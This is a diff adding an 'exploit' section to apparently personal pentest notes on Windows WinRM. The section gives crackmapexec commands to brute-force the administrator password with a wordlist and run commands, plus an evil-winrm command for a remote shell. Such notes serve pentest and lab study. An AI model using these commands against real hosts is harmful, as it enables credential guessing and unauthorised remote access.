@@ -109,3 +109,19 @@ Used to :
 *○ Remotely access and interact with Windows hosts on a local network.*
 *○ Remotely access and execute commands on Windows systems.*
 *○ Manage and configure Windows systems remotely.*
+
+#### Exploit using crackmapexec
+
+```bash
+crackmapexec winrm IP -u administrator -p WORDLIST
+```
+Once you have the passsword ->
+```bash
+crackmapexec winrm IP -u administrator -p PASS -x CMD
+```
+
+#### Exploit using evil-winrm
+Get a shell using ->
+```bash
+evil-winrm.rb -u USER -p 'PASS' -i IP
+```
